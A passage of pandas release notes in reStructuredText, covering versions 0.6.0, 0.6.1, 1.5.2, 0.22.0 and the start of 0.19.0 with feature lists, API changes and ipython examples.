``DataFrame.sort_index`` (:issue:`92`, :issue:`362`)\n- :ref:`Added <indexing.basics.get_value>` fast ``get_value`` and ``put_value`` methods to DataFrame (:issue:`360`)\n- Added ``cov`` instance methods to Series and DataFrame (:issue:`194`, :issue:`362`)\n- :ref:`Added <visualization.barplot>` ``kind='bar'`` option to ``DataFrame.plot`` (:issue:`348`)\n- :ref:`Added <basics.idxmin>` ``idxmin`` and ``idxmax`` to Series and DataFrame (:issue:`286`)\n- :ref:`Added <io.clipboard>` ``read_clipboard`` function to parse DataFrame from clipboard (:issue:`300`)\n- :ref:`Added <basics.stats>` ``nunique`` function to Series for counting unique elements (:issue:`297`)\n- :ref:`Made <basics.dataframe>` DataFrame constructor use Series name if no columns passed (:issue:`373`)\n- :ref:`Support <io.parse_dates>` regular expressions in read_table/read_csv (:issue:`364`)\n- :ref:`Added <io.html>` ``DataFrame.to_html`` for writing DataFrame to HTML (:issue:`387`)\n- :ref:`Added <basics.dataframe>` support for MaskedArray data in DataFrame, masked values converted to NaN (:issue:`396`)\n- :ref:`Added <visualization.box>` ``DataFrame.boxplot`` function (:issue:`368`)\n- :ref:`Can <basics.apply>` pass extra args, kwds to DataFrame.apply (:issue:`376`)\n- :ref:`Implement <merging.multikey_join>` ``DataFrame.join`` with vector ``on`` argument (:issue:`312`)\n- :ref:`Added <visualization.basic>` ``legend`` boolean flag to ``DataFrame.plot`` (:issue:`324`)\n- :ref:`Can <reshaping.stacking>` pass multiple levels to ``stack`` and ``unstack`` (:issue:`370`)\n- :ref:`Can <reshaping.pivot>` pass multiple values columns to ``pivot_table`` (:issue:`381`)\n- :ref:`Use <groupby.multiindex>` Series name in GroupBy for result index (:issue:`363`)\n- :ref:`Added <basics.apply>` ``raw`` option to ``DataFrame.apply`` for performance if only need ndarray (:issue:`309`)\n- Added proper, tested weighted least squares to standard and panel OLS (:issue:`303`)\n\nPerformance enhancements\n~~~~~~~~~~~~~~~~~~~~~~~~\n- VBENCH Cythonized ``cache_readonly``, resulting in substantial micro-performance enhancements throughout the code base (:issue:`361`)\n- VBENCH Special Cython matrix iterator for applying arbitrary reduction operations with 3-5x better performance than ``np.apply_along_axis`` (:issue:`309`)\n- VBENCH Improved performance of ``MultiIndex.from_tuples``\n- VBENCH Special Cython matrix iterator for applying arbitrary reduction operations\n- VBENCH + DOCUMENT Add ``raw`` option to ``DataFrame.apply`` for getting better performance when\n- VBENCH Faster cythonized count by level in Series and DataFrame (:issue:`341`)\n- VBENCH? Significant GroupBy performance enhancement with multiple keys with many \"empty\" combinations\n- VBENCH New Cython vectorized function ``map_infer`` speeds up ``Series.apply`` and ``Series.map`` significantly when passed elementwise Python function, motivated by (:issue:`355`)\n- VBENCH Significantly improved performance of ``Series.order``, which also makes np.unique called on a Series faster (:issue:`327`)\n- VBENCH Vastly improved performance of GroupBy on axes with a MultiIndex (:issue:`299`)\n\n\n\n.. _whatsnew_0.6.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.5.0..v0.6.0\n\n\n\n.. _whatsnew_061:\n\nVersion 0.6.1 (December 13, 2011)\n---------------------------------\n\nNew features\n~~~~~~~~~~~~\n- Can append single rows (as Series) to a DataFrame\n- Add Spearman and Kendall rank correlation\n  options to Series.corr and DataFrame.corr (:issue:`428`)\n- :ref:`Added <indexing.basics.get_value>` ``get_value`` and ``set_value`` methods to\n  Series, DataFrame, and Panel for very low-overhead access (>2x faster in many\n  cases) to scalar elements (:issue:`437`, :issue:`438`). ``set_value`` is capable of\n  producing an enlarged object.\n- Add PyQt table widget to sandbox (:issue:`435`)\n- DataFrame.align can :ref:`accept Series arguments <basics.align.frame.series>`\n  and an :ref:`axis option <basics.df_join>` (:issue:`461`)\n- Implement new :ref:`SparseArray <sparse.array>` and ``SparseList``\n  data structures. SparseSeries now derives from SparseArray (:issue:`463`)\n- :ref:`Better console printing options <basics.console_output>` (:issue:`453`)\n- Implement fast data ranking for Series and\n  DataFrame, fast versions of scipy.stats.rankdata (:issue:`428`)\n- Implement ``DataFrame.from_items`` alternate\n  constructor (:issue:`444`)\n- DataFrame.convert_objects method for :ref:`inferring better dtypes <basics.cast>`\n  for object columns (:issue:`302`)\n- Add :ref:`rolling_corr_pairwise <window.corr_pairwise>` function for\n  computing Panel of correlation matrices (:issue:`189`)\n- Add :ref:`margins <reshaping.pivot.margins>` option to :ref:`pivot_table\n  <reshaping.pivot>` for computing subgroup aggregates (:issue:`114`)\n- Add ``Series.from_csv`` function (:issue:`482`)\n- :ref:`Can pass <window.cov_corr>` DataFrame/DataFrame and\n  DataFrame/Series to rolling_corr/rolling_cov (GH 462)\n- MultiIndex.get_level_values can :ref:`accept the level name <advanced.get_level_values>`\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Improve memory usage of ``DataFrame.describe`` (do not copy data\n  unnecessarily) (PR 425)\n\n- Optimize scalar value lookups in the general case by 25% or more in Series\n  and DataFrame\n\n- Fix performance regression in cross-sectional count in DataFrame, affecting\n  DataFrame.dropna speed\n- Column deletion in DataFrame copies no data (computes views on blocks) (GH\n  158)\n\n\n\n.. _whatsnew_0.6.1.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.6.0..v0.6.1\n\n\n.. _whatsnew_152:\n\nWhat's new in 1.5.2 (November 21, 2022)\n---------------------------------------\n\nThese are the changes in pandas 1.5.2. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_152.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :meth:`MultiIndex.join` for extension array dtypes (:issue:`49277`)\n- Fixed regression in :meth:`Series.replace` raising ``RecursionError`` with numeric dtype and when specifying ``value=None`` (:issue:`45725`)\n- Fixed regression in arithmetic operations for :class:`DataFrame` with :class:`MultiIndex` columns with different dtypes (:issue:`49769`)\n- Fixed regression in :meth:`DataFrame.plot` preventing :class:`~matplotlib.colors.Colormap` instance\n  from being passed using the ``colormap`` argument if Matplotlib 3.6+ is used (:issue:`49374`)\n- Fixed regression in :func:`date_range` returning an invalid set of periods for ``CustomBusinessDay`` frequency and ``start`` date with timezone (:issue:`49441`)\n- Fixed performance regression in groupby operations (:issue:`49676`)\n- Fixed regression in :class:`Timedelta` constructor returning object of wrong type when subclassing ``Timedelta`` (:issue:`49579`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_152.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in the Copy-on-Write implementation losing track of views in certain chained indexing cases (:issue:`48996`)\n- Fixed memory leak in :meth:`.Styler.to_excel` (:issue:`49751`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_152.other:\n\nOther\n~~~~~\n- Reverted ``color`` as an alias for ``c`` and ``size`` as an alias for ``s`` in function :meth:`DataFrame.plot.scatter` (:issue:`49732`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_152.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.5.1..v1.5.2\n\n\n.. _whatsnew_0220:\n\nVersion 0.22.0 (December 29, 2017)\n----------------------------------\n\n{{ header }}\n\n.. ipython:: python\n   :suppress:\n\n   from pandas import *   noqa F401, F403\n\n\nThis is a major release from 0.21.1 and includes a single, API-breaking change.\nWe recommend that all users upgrade to this version after carefully reading the\nrelease note (singular!).\n\n.. _whatsnew_0220.api_breaking:\n\nBackwards incompatible API changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\npandas 0.22.0 changes the handling of empty and all-*NA* sums and products. The\nsummary is that\n\n* The sum of an empty or all-*NA* ``Series`` is now ``0``\n* The product of an empty or all-*NA* ``Series`` is now ``1``\n* We've added a ``min_count`` parameter to ``.sum()`` and ``.prod()`` controlling\n  the minimum number of valid values for the result to be valid. If fewer than\n  ``min_count`` non-*NA* values are present, the result is *NA*. The default is\n  ``0``. To return ``NaN``, the 0.21 behavior, use ``min_count=1``.\n\nSome background: In pandas 0.21, we fixed a long-standing inconsistency\nin the return value of all-*NA* series depending on whether or not bottleneck\nwas installed. See :ref:`whatsnew_0210.api_breaking.bottleneck`. At the same\ntime, we changed the sum and prod of an empty ``Series`` to also be ``NaN``.\n\nBased on feedback, we've partially reverted those changes.\n\nArithmetic operations\n^^^^^^^^^^^^^^^^^^^^^\n\nThe default sum for empty or all-*NA* ``Series`` is now ``0``.\n\n*pandas 0.21.x*\n\n.. code-block:: ipython\n\n   In [1]: pd.Series([]).sum()\n   Out[1]: nan\n\n   In [2]: pd.Series([np.nan]).sum()\n   Out[2]: nan\n\n*pandas 0.22.0*\n\n.. ipython:: python\n   :okwarning:\n\n   pd.Series([]).sum()\n   pd.Series([np.nan]).sum()\n\nThe default behavior is the same as pandas 0.20.3 with bottleneck installed. It\nalso matches the behavior of NumPy's ``np.nansum`` on empty and all-*NA* arrays.\n\nTo have the sum of an empty series return ``NaN`` (the default behavior of\npandas 0.20.3 without bottleneck, or pandas 0.21.x), use the ``min_count``\nkeyword.\n\n.. ipython:: python\n   :okwarning:\n\n   pd.Series([]).sum(min_count=1)\n\nThanks to the ``skipna`` parameter, the ``.sum`` on an all-*NA*\nseries is conceptually the same as the ``.sum`` of an empty one with\n``skipna=True`` (the default).\n\n.. ipython:: python\n\n   pd.Series([np.nan]).sum(min_count=1)   skipna=True by default\n\nThe ``min_count`` parameter refers to the minimum number of *non-null* values\nrequired for a non-NA sum or product.\n\n:meth:`Series.prod` has been updated to behave the same as :meth:`Series.sum`,\nreturning ``1`` instead.\n\n.. ipython:: python\n   :okwarning:\n\n   pd.Series([]).prod()\n   pd.Series([np.nan]).prod()\n   pd.Series([]).prod(min_count=1)\n\nThese changes affect :meth:`DataFrame.sum` and :meth:`DataFrame.prod` as well.\nFinally, a few less obvious places in pandas are affected by this change.\n\nGrouping by a Categorical\n^^^^^^^^^^^^^^^^^^^^^^^^^\n\nGrouping by a ``Categorical`` and summing now returns ``0`` instead of\n``NaN`` for categories with no observations. The product now returns ``1``\ninstead of ``NaN``.\n\n*pandas 0.21.x*\n\n.. code-block:: ipython\n\n   In [8]: grouper = pd.Categorical(['a', 'a'], categories=['a', 'b'])\n\n   In [9]: pd.Series([1, 2]).groupby(grouper, observed=False).sum()\n   Out[9]:\n   a    3.0\n   b    NaN\n   dtype: float64\n\n*pandas 0.22*\n\n.. ipython:: python\n\n   grouper = pd.Categorical([\"a\", \"a\"], categories=[\"a\", \"b\"])\n   pd.Series([1, 2]).groupby(grouper, observed=False).sum()\n\nTo restore the 0.21 behavior of returning ``NaN`` for unobserved groups,\nuse ``min_count>=1``.\n\n.. ipython:: python\n\n   pd.Series([1, 2]).groupby(grouper, observed=False).sum(min_count=1)\n\nResample\n^^^^^^^^\n\nThe sum and product of all-*NA* bins has changed from ``NaN`` to ``0`` for\nsum and ``1`` for product.\n\n*pandas 0.21.x*\n\n.. code-block:: ipython\n\n   In [11]: s = pd.Series([1, 1, np.nan, np.nan],\n      ....:               index=pd.date_range('2017', periods=4))\n      ....: s\n   Out[11]:\n   2017-01-01    1.0\n   2017-01-02    1.0\n   2017-01-03    NaN\n   2017-01-04    NaN\n   Freq: D, dtype: float64\n\n   In [12]: s.resample('2d').sum()\n   Out[12]:\n   2017-01-01    2.0\n   2017-01-03    NaN\n   Freq: 2D, dtype: float64\n\n*pandas 0.22.0*\n\n.. ipython:: python\n\n   s = pd.Series([1, 1, np.nan, np.nan], index=pd.date_range(\"2017\", periods=4))\n   s.resample(\"2d\").sum()\n\nTo restore the 0.21 behavior of returning ``NaN``, use ``min_count>=1``.\n\n.. ipython:: python\n\n   s.resample(\"2d\").sum(min_count=1)\n\nIn particular, upsampling and taking the sum or product is affected, as\nupsampling introduces missing values even if the original series was\nentirely valid.\n\n*pandas 0.21.x*\n\n.. code-block:: ipython\n\n   In [14]: idx = pd.DatetimeIndex(['2017-01-01', '2017-01-02'])\n\n   In [15]: pd.Series([1, 2], index=idx).resample('12H').sum()\n   Out[15]:\n   2017-01-01 00:00:00    1.0\n   2017-01-01 12:00:00    NaN\n   2017-01-02 00:00:00    2.0\n   Freq: 12H, dtype: float64\n\n*pandas 0.22.0*\n\n.. code-block:: ipython\n\n   In [14]: idx = pd.DatetimeIndex([\"2017-01-01\", \"2017-01-02\"])\n   In [15]: pd.Series([1, 2], index=idx).resample(\"12H\").sum()\n   Out[15]:\n   2017-01-01 00:00:00    1\n   2017-01-01 12:00:00    0\n   2017-01-02 00:00:00    2\n   Freq: 12H, Length: 3, dtype: int64\n\nOnce again, the ``min_count`` keyword is available to restore the 0.21 behavior.\n\n.. code-block:: ipython\n\n   In [16]: pd.Series([1, 2], index=idx).resample(\"12H\").sum(min_count=1)\n   Out[16]:\n   2017-01-01 00:00:00    1.0\n   2017-01-01 12:00:00    NaN\n   2017-01-02 00:00:00    2.0\n   Freq: 12H, Length: 3, dtype: float64\n\n\nRolling and expanding\n^^^^^^^^^^^^^^^^^^^^^\n\nRolling and expanding already have a ``min_periods`` keyword that behaves\nsimilar to ``min_count``. The only case that changes is when doing a rolling\nor expanding sum with ``min_periods=0``. Previously this returned ``NaN``,\nwhen fewer than ``min_periods`` non-*NA* values were in the window. Now it\nreturns ``0``.\n\n*pandas 0.21.1*\n\n.. code-block:: ipython\n\n   In [17]: s = pd.Series([np.nan, np.nan])\n\n   In [18]: s.rolling(2, min_periods=0).sum()\n   Out[18]:\n   0   NaN\n   1   NaN\n   dtype: float64\n\n*pandas 0.22.0*\n\n.. ipython:: python\n\n   s = pd.Series([np.nan, np.nan])\n   s.rolling(2, min_periods=0).sum()\n\nThe default behavior of ``min_periods=None``, implying that ``min_periods``\nequals the window size, is unchanged.\n\nCompatibility\n~~~~~~~~~~~~~\n\nIf you maintain a library that should work across pandas versions, it\nmay be easiest to exclude pandas 0.21 from your requirements. Otherwise, all your\n``sum()`` calls would need to check if the ``Series`` is empty before summing.\n\nWith setuptools, in your ``setup.py`` use::\n\n    install_requires=['pandas!=0.21.*', ...]\n\nWith conda, use\n\n.. code-block:: yaml\n\n    requirements:\n      run:\n        - pandas !=0.21.0,!=0.21.1\n\nNote that the inconsistency in the return value for all-*NA* series is still\nthere for pandas 0.20.3 and earlier. Avoiding pandas 0.21 will only help with\nthe empty case.\n\n\n.. _whatsnew_0.22.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.21.1..v0.22.0\n\n\n.. _whatsnew_0190:\n\nVersion 0.19.0 (October 2, 2016)\n--------------------------------\n\n{{ header }}\n\nThis is a major release from 0.18.1 and includes number of API changes, several new features,\nenhancements, and performance improvements along with a large number of bug fixes. We recommend that all\nusers upgrade to this version.\n\nHighlights include:\n\n- :func:`merge_asof` for asof-style time-series joining, see :ref:`here <whatsnew_0190.enhancements.asof_merge>`\n- ``.rolling()`` is now time-series aware, see :ref:`here <whatsnew_0190.enhancements.rolling_ts>`\n- :func:`read_csv` now supports parsing ``Categorical`` data, see :ref:`here <whatsnew_0190.enhancements.read_csv_categorical>`\n- A function :func:`union_categorical` has been added for combining categoricals, see :ref:`here <whatsnew_0190.enhancements.union_categoricals>`\n- ``PeriodIndex`` now has its own ``period`` dtype, and changed to be more consistent with other ``Index`` classes. See :ref:`here <whatsnew_0190.api.period>`\n- Sparse data structures gained enhanced support of ``int`` and ``bool`` dtypes, see :ref:`here <whatsnew_0190.sparse>`\n- Comparison operations with ``Series`` no longer ignores the index, see :ref:`here <whatsnew_0190.api.series_ops>` for an overview of the API changes.\n- Introduction of a pandas development API for utility functions, see :ref:`here <whatsnew_0190.dev_api>`.\n- Deprecation of ``Panel4D`` and ``PanelND``. We recommend to represent these types of n-dimensional data with the `xarray package <http://xarray.pydata.org/en/stable/>`__.\n- Removal of the previously deprecated modules ``pandas.io.data``, ``pandas.io.wb``, ``pandas.tools.rplot``.\n\n.. warning::\n\n    pandas >= 0.19.0 will no longer silence numpy ufunc warnings upon import, see :ref:`here <whatsnew_0190.errstate>`.\n\n.. contents:: What's new in v0.19.0\n    :local:\n    :backlinks: none\n\n.. _whatsnew_0190.new_features:\n\nNew features\n~~~~~~~~~~~~\n\n.. _whatsnew_0190.enhancements.asof_merge:\n\nFunction ``merge_asof`` for asof-style time-series joining\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nA long-time requested feature has been added through the :func:`merge_asof` function, to\nsupport asof style joining of time-series (:issue:`1870`, :issue:`13695`, :issue:`13709`, :issue:`13902`). Full documentation is\n:ref:`here <merging.merge_asof>`.\n\nThe :func:`merge_asof` performs an asof merge, which is similar to a left-join\nexcept that we match on nearest key rather than equal keys.\n\n.. ipython:: python\n\n   left = pd.DataFrame({\"a\": [1, 5, 10], \"left_val\": [\"a\", \"b\", \"c\"]})\n   right = pd.DataFrame({\"a\": [1, 2, 3, 6, 7], \"right_val\": [1, 2, 3, 6, 7]})\n\n   left\n   right\n\nWe typically want to match exactly when possible, and use the most\nrecent value otherwise.\n\n.. ipython:: python\n\n   pd.merge_asof(left, right, on=\"a\")\n\nWe can also match rows ONLY with prior data, and not an exact match.\n\n.. ipython:: python\n\n   pd.merge_asof(left, right, on=\"a\", allow_exact_matches=False)\n\n\nIn a typical time-series example, we have ``trades`` and ``quotes`` and we want to ``asof-join`` them.\nThis also illustrates using the ``by`` parameter to group data before merging.\n\n.. ipython:: python\n\n   trades = pd.DataFrame(\n       {\n           \"time\": pd.to_datetime(\n               [\n                   \"20160525 13:30:00.023\",\n                   \"20160525 13:30:00.038\",\n                   \"20160525 13:30:00.048\",\n                   \"20160525 13:30:00.048\",\n                   \"20160525 13:30:00.048\",\n               ]\n           ),\n           \"ticker\": [\"MSFT\", \"MSFT\", \"GOOG\", \"GOOG\", \"AAPL\"],\n           \"price\": [51.95, 51.95, 720.77, 720.92, 98.00],\n           \"quantity\": [75, 155, 100, 100, 100],\n       },\n       columns=[\"time\", \"ticker\", \"price\", \"quantity\"],\n   )\n\n   quotes = pd.DataFrame(\n       {\n           \"time\": pd.to_datetime(\n               [\n                   \"20160525 13:30:00.023\",\n                   \"20160525 13:30:00.023\",\n                   \"20160525 13:30:00.030\",\n                   \"20160525 13:30:00.041\",\n                   \"20160525 13:30:00.048\",\n                   \"20160525 13:30:00.049\",\n                   \"20160525 13:30:00.072\",\n                   \"20160525 13:30:00.075\",\n               ]\n           ),\n           \"ticker\": [\"GOOG\", \"MSFT\", \"MSFT\", \"MSFT\", \"GOOG\", \"AAPL\", \"GOOG\", \"MSFT\"],\n           \"bid\": [720.50, 51.95, 51.97, 51.99, 720.50, 97.99, 720.50, 52.01],\n           \"ask\": [720.93, 51.96, 51.98, 52.00, 720.93, 98.01, 720.88, 52.03],\n       },\n       columns=[\"time\", \"ticker\", \"bid\", \"ask\"],\n   )\n\n.. ipython:: python\n\n   trades\n   quotes\n\nAn asof merge joins on the ``on``, typically a datetimelike field, which is ordered, and\nin this case we are using a grouper in the ``by`` field. This is like a left-outer join, except\nthat forward filling happens automatically taking the most recent non-NaN value.\n\n.. ipython:: python\n\n   pd.merge_asof(trades, quotes, on=\"time\", by=\"ticker\")\n\nThis returns a merged DataFrame with the entries in the same order as the original left\npassed DataFrame (``trades`` in this case), with the fields of the ``quotes`` merged.\n\n.. _whatsnew_0190.enhancements.rolling_ts:\n\nMethod ``.rolling()`` is now time-series aware\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n``.rolling()`` objects are now time-series aware and can accept a time-series offset (or convertible) for the ``window`` argument (:issue:`13327`, :issue:`12995`).\nSee the full documentation :ref:`here <window.generic>`.\n\n.. ipython:: python\n\n   dft = pd.DataFrame(\n       {\"B\": [0, 1, 2, np.nan, 4]},\n       index=pd.date_range(\"20130101 09:00:00\", periods=5, freq=\"s\"),\n   )\n   dft\n\nThis is a regular frequency index. Using an integer window parameter works to roll along the window frequency.\n\n.. ipython:: python\n\n   dft.rolling(2).sum()\n   dft.rolling(2, min_periods=1).sum()\n\nSpecifying an offset allows a more intuitive specification of the rolling frequency.\n\n.. ipython:: python\n\n   dft.rolling(\"2s\").sum()\n\nUsing a non-regular, but still monotonic index, rolling with an integer window does not impart any special calculation.\n\n.. ipython:: python\n\n\n   dft = pd.DataFrame(\n       {\"B\": [0, 1, 2, np.nan, 4]},\n       index=pd.Index(\n           [\n               pd.Timestamp(\"20130101 09:00:00\"),\n               pd.Timestamp(\"20130101 09:00:02\"),\n               pd.Timestamp(\"20130101 09:00:03\"),\n               pd.Timestamp(\"20130101 09:00:05\"),\n               pd.Timestamp(\"20130101 09:00:06\"),\n           ],\n           name=\"foo\",\n       ),\n   )\n\n   dft\n   dft.rolling(2).sum()\n\nUsing the time-specification generates variable windows for this sparse data.\n\n.. ipython:: python\n\n   dft.rolling(\"2s\").sum()\n\nFurthermore, we now allow an optional ``on`` parameter to specify a column (rather than the\ndefault of the index) in a DataFrame.\n\n.. ipython:: python\n\n   dft = dft.reset_index()\n   dft\n   dft.rolling(\"2s\", on=\"foo\").sum()\n\n.. _whatsnew_0190.enhancements.read_csv_dupe_col_names_support:\n\nMethod ``read_csv`` has improved support for duplicate column names\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n.. ipython:: python\n   :suppress:\n\n   from io import StringIO\n\n:ref:`Duplicate column names <io.dupe_names>` are now supported in :func:`read_csv` whether\nthey are in the file or passed in as the ``names`` parameter (:issue:`7160`, :issue:`9424`)\n\n.. ipython:: python\n\n   data = \"0,1,2\\n3,4,5\"\n   names = [\"a\", \"b\", \"a\"]\n\n**Previous behavior**:\n\n.. code-block:: ipython\n\n   In [2]: pd.read_csv(StringIO(data), names=names)\n   Out[2]:\n      a  b  a\n   0  2  1  2\n   1  5  4  5\n\nThe first ``a`` column contained the same data as the second ``a`` column, when it should have\ncontained the values ``[0, 3]``.\n\n**New behavior**:\n\n.. ipython:: python\n   :okexcept:\n\n   pd.read_csv(StringIO(data), names=names)\n\n\n.. _whatsnew_0190.enhancements.read_csv_categorical:\n\nMethod ``read_csv`` supports parsing ``Categorical`` directly\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe :func:`read_csv` function now supports parsing a ``Categorical`` column when\nspecified as a dtype (:issue:`10153`).  Depending on the structure of the data,\nthis can result in a faster parse time and lower memory usage compared to\nconverting to ``Categorical`` after parsing.  See the io :ref:`docs here <io.categorical>`.\n\n.. ipython:: python\n\n   data = \"\"\"\n   col1,col2,col3\n   a,b,1\n   a,b,2\n   c,d,3\n   \"\"\"\n\n   pd.read_csv(StringIO(data))\n   pd.read_csv(StringIO(data)).dtypes\n   pd.read_csv(StringIO(data), dtype=\"category\").dtypes\n\nIndividual columns can be parsed as a ``Categorical`` using a dict specification\n\n.. ipython:: python\n\n   pd.read_csv(StringIO(data), dtype={\"col1\": \"category\"}).dtypes\n\n.. note::\n\n   The resulting categories will always be parsed as strings (object dtype).\n   If the categories are numeric they can be converted using the\n   :func:`to_numeric` function, or as appropriate, another converter\n   such as :func:`to_datetime`.\n\n   .. ipython:: python\n\n      df = pd.read_csv(StringIO(data), dtype=\"category\")\n      df.dtypes\n      df[\"col3\"]\n      new_categories = pd.to_numeric(df[\"col3\"].cat.categories)\n      df[\"col3\"] = df[\"col3\"].cat.rename_categories(new_categories)\n      df[\"col3\"]\n\n.. _whatsnew_0190.enhancements.union_categoricals:\n\nCategorical concatenation\n^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- A function :func:`union_categoricals` has been added for combining categoricals, see :ref:`Unioning Categoricals<categorical.union>` (:issue:`13361`, :issue:`13763`, :issue:`13846`, :issue:`14173`)\n\n  .. ipython:: python\n\n     from pandas.api.types import union_categoricals\n\n     a = pd.Categorical([\"b\", \"c\"])\n     b = pd.Categorical([\"a\", \"b\"])\n     union_categoricals([a, b])\n\n- ``concat`` and ``append`` now can concat ``category`` dtypes with different ``categories`` as ``object`` dtype (:issue:`13524`)\n\n  .. ipython:: python\n\n     s1 = pd.Series([\"a\", \"b\"], dtype=\"category\")\n     s2 = pd.Series([\"b\", \"c\"], dtype=\"category\")\n\n**Previous behavior**:\n\n.. code-block:: ipython\n\n   In [1]: pd.concat([s1, s2])\n   ValueError: incompatible categories in categorical concat\n\n**New behavior**:\n\n.. ipython:: python\n\n   pd.concat([s1, s2])\n\n.. _whatsnew_0190.enhancements.semi_month_offsets:\n\nSemi-month offsets\n^^^^^^^^^^^^^^^^^^\n\npandas has gained new frequency offsets, ``SemiMonthEnd`` ('SM') and ``SemiMonthBegin`` ('SMS').\nThese provide date offsets anchored (by default) to the 15th and end of month, and 15th and 1st of month respectively.\n(:issue:`1543`)\n\n.. ipython:: python\n\n   from pandas.tseries.offsets import SemiMonthEnd, SemiMonthBegin\n\n**SemiMonthEnd**:\n\n.. code-block:: python\n\n   In [46]: pd.Timestamp(\"2016-01-01\") + SemiMonthEnd()\n   Out[46]: Timestamp('2016-01-15 00:00:00')\n\n   In [47]: pd.date_range(\"2015-01-01\", freq=\"SM\", periods=4)\n   Out[47]: DatetimeIndex(['2015-01-15', '2015-01-31', '2015-02-15', '2015-02-28'], dtype='datetime64[ns]', freq='SM-15')\n\n**SemiMonthBegin**:\n\n.. ipython:: python\n\n   pd.Timestamp(\"2016-01-01\") + SemiMonthBegin()\n\n   pd.date_range(\"2015-01-01\", freq=\"SMS\", periods=4)\n\nUsing the anchoring suffix, you can also specify the day of month to use instead of the 15th.\n\n.. code-block:: python\n\n   In [50]: pd.date_range(\"2015-01-01\", freq=\"SMS-16\", periods=4)\n   Out[50]: DatetimeIndex(['2015-01-01', '2015-01-16', '2015-02-01', '2015-02-16'], dtype='datetime64[ns]', freq='SMS-16')\n\n   In [51]: pd.date_range(\"2015-01-01\", freq=\"SM-14\", periods=4)\n   Out[51]: DatetimeIndex(['2015-01-14', '2015-01-31', '2015-02-14', '2015-02-28'], dtype='datetime64[ns]', freq='SM-14')\n\n.. _whatsnew_0190.enhancements.index:\n\nNew Index methods\n^^^^^^^^^^^^^^^^^\n\nThe following methods and options are added to ``Index``, to be more consistent with the ``Series`` and ``DataFrame`` API.\n\n``Index`` now supports the ``.where()`` function for same shape indexing (:issue:`13170`)\n\n.. ipython:: python\n\n   idx = pd.Index([\"a\", \"b\", \"c\"])\n   idx.where([True, False, True])\n\n\n``Index`` now supports ``.dropna()`` to exclude missing values (:issue:`6194`)\n\n.. ipython:: python\n\n   idx = pd.Index([1, 2, np.nan, 4])\n   idx.dropna()\n\nFor ``MultiIndex``, values are dropped if any level is missing by default. Specifying\n``how='all'`` only drops values where all levels are missing.\n\n.. ipython:: python\n\n   midx = pd.MultiIndex.from_arrays([[1, 2, np.nan, 4], [1, 2, np.nan, np.nan]])\n   midx\n   midx.dropna()\n   midx.dropna(how=\"all\")\n\n``Index`` now supports ``.str.extractall()`` which returns a ``DataFrame``, see the :ref:`docs here <text.extractall>` (:issue:`10008`, :issue:`13156`)\n\n.. ipython:: python\n\n   idx = pd.Index([\"a1a2\", \"b1\", \"c1\"])\n   idx.str.extractall(r\"[ab](?P<digit>\\d)\")\n\n``Index.astype()`` now accepts an optional boolean argument ``copy``, which allows optional copying if the requirements on dtype are satisfied (:issue:`13209`)\n\n.. _whatsnew_0190.gbq:\n\nGoogle BigQuery enhancements\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- The :func:`read_gbq` method has gained the ``dialect`` argument to allow users to specify whether to use BigQuery's legacy SQL or BigQuery's standard SQL. See the `docs <https://pandas-gbq.readthedocs.io/en/latest/reading.html>`__ for more details (:issue:`13615`).\n- The :func:`~DataFrame.to_gbq` method now allows the DataFrame column order to differ from the destination table schema (:issue:`11359`).\n\n.. _whatsnew_0190.errstate:\n\nFine-grained NumPy errstate\n^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPrevious versions of pandas would permanently silence numpy's ufunc error handling when ``pandas`` was imported. pandas did this in order to silence the warnings that would arise from using numpy ufuncs on missing data, which are usually represented as ``NaN`` s. Unfortunately, this silenced legitimate warnings arising in non-pandas code in the application. Starting with 0.19.0, pandas will use the ``numpy.errstate`` context manager to silence these warnings in a more fine-grained manner, only around where these operations are actually used in the pandas code base. (:issue:`13109`, :issue:`13145`)\n\nAfter upgrading pandas, you may see *new* ``RuntimeWarnings`` being issued from your code. These are likely legitimate, and the underlying cause likely existed in the code when using previous versions of pandas that simply silenced the warning. Use `numpy.errstate <https://numpy.org/doc/stable/reference/generated/numpy.errstate.html>`__ around the source of the ``RuntimeWarning`` to control how these conditions are handled.\n\n.. _whatsnew_0190.get_dummies_dtypes:\n\nMethod ``get_dummies`` now returns integer dtypes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe ``pd.get_dummies`` function now returns dummy-encoded columns as small integers, rather than floats (:issue:`8725`). This should provide an improved memory footprint.\n\n**Previous behavior**:\n\n.. code-block:: ipython\n\n   In [1]: pd.get_dummies(['a', 'b', 'a', 'c']).dtypes\n\n   Out[1]:\n   a    float64\n   b    float64\n   c    float64\n   dtype: object\n\n**New behavior**:\n\n.. ipython:: python\n\n   pd.get_dummies([\"a\", \"b\", \"a\", \"c\"]).dtypes\n\n\n.. _whatsnew_0190.enhancements.to_numeric_downcast:\n\nDowncast values to smallest possible dtype in ``to_numeric``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n``pd.to_numeric()`` now accepts a ``downcast`` parameter, which will downcast the data if possible to smallest specified numerical dtype (:issue:`13352`)\n\n.. 